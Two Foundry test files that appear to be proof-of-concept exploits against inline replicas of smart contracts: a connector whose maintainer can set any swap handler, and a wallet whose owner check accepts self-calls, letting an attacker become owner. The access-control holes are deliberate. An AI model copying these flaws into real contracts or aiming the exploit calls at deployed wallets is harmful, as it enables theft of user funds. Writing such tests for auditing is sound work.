// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal stub for the SwapAndBridgeHandler type
contract SwapAndBridgeHandler {}

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract BaseConnector {
    // only the state + functions your exploit touches
    address public owner;
    mapping(address => bool) public maintainers;
    SwapAndBridgeHandler public swapHandler;

    event SwapHandlerUpdated(address indexed newHandler);

    modifier onlyMaintainer() {
        require(maintainers[msg.sender], "not maintainer");
        _;
    }

    constructor(address initialMaintainer) {
        owner = msg.sender;
        maintainers[initialMaintainer] = true; // grant maintainer to the provided address
    }

    function updateSwapHandler(address payable _swapHandler) external onlyMaintainer {
        // missing validation: any maintainer can set any address (including malicious or zero)
        swapHandler = SwapAndBridgeHandler(_swapHandler);
        emit SwapHandlerUpdated(_swapHandler);
    }
}

contract BaseConnectorTest is Test {
    BaseConnector target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        // deploy target and grant attacker the maintainer role via constructor
        target = new BaseConnector(attacker);
    }

    function test_attacker_exploits_updateSwapHandler() public {
        // attacker deploys a malicious handler contract
        SwapAndBridgeHandler malicious = new SwapAndBridgeHandler();

        // attacker (a maintainer) updates the swap handler to the malicious contract
        vm.prank(attacker);
        target.updateSwapHandler(payable(address(malicious)));

        // assert that the swapHandler was changed to the malicious address
        assertEq(address(target.swapHandler()), address(malicious));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract CoinbaseSmartWallet {
    error Unauthorized();

    address public owner;
    address public entry;

    constructor(address _entry) {
        entry = _entry;
        // initialize with a different owner
        owner = address(0xBEEF);
    }

    modifier onlyEntryPoint() {
        if (msg.sender != entry) revert Unauthorized();
        _;
    }

    // VULNERABLE: onlyOwner incorrectly treats the contract itself as an allowed sender,
    // which makes self-calls (msg.sender == address(this)) pass the owner check.
    modifier onlyOwner() {
        if (msg.sender != owner && msg.sender != address(this)) revert Unauthorized();
        _;
    }

    function entryPoint() public view returns (address) {
        return entry;
    }

    function canSkipChainIdValidation(bytes4 functionSelector) public pure returns (bool) {
        return (functionSelector == this.addOwnerAddress.selector
            || functionSelector == this.upgradeToAndCall.selector);
    }

    function executeWithoutChainIdValidation(bytes calldata data) public payable onlyEntryPoint {
        bytes4 selector = bytes4(data[0:4]);
        if (!canSkipChainIdValidation(selector)) revert("SelectorNotAllowed");
        _call(address(this), 0, data);
    }

    // Minimal addOwner function (protected by onlyOwner in the real contract)
    function addOwnerAddress(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    // Minimal UUPS-like upgrade function (protected by onlyOwner via _authorizeUpgrade)
    function upgradeToAndCall(address newImpl, bytes calldata data) external {
        _authorizeUpgrade(newImpl);
        // simplified: store the implementation address
        // (not used further in this PoC)
        // if data provided, delegate to self for demonstration
        if (data.length > 0) {
            (bool ok, ) = address(this).call(data);
            require(ok);
        }
    }

    function _authorizeUpgrade(address) internal view onlyOwner {}

    function _call(address target, uint256 value, bytes memory data) internal {
        (bool success, bytes memory result) = target.call{value: value}(data);
        if (!success) {
            assembly ("memory-safe") {
                revert(add(result, 32), mload(result))
            }
        }
    }
}

contract CoinbaseSmartWalletTest is Test {
    CoinbaseSmartWallet target;
    address attacker;
    address entryPointAddr;

    function setUp() public {
        entryPointAddr = makeAddr("entrypoint");
        attacker = makeAddr("attacker");
        target = new CoinbaseSmartWallet(entryPointAddr);
    }

    function test_attacker_exploits_executeWithoutChainIdValidation() public {
        // Craft calldata for addOwnerAddress(attacker)
        bytes memory data = abi.encodeWithSelector(target.addOwnerAddress.selector, attacker);

        // The EntryPoint (which we control in the test) calls executeWithoutChainIdValidation
        vm.prank(entryPointAddr);
        target.executeWithoutChainIdValidation(data);

        // Because onlyOwner incorrectly allows msg.sender == address(this), the self-call performed
        // by executeWithoutChainIdValidation succeeded in calling addOwnerAddress and changed the owner
        assertEq(target.owner(), attacker);
    }
}

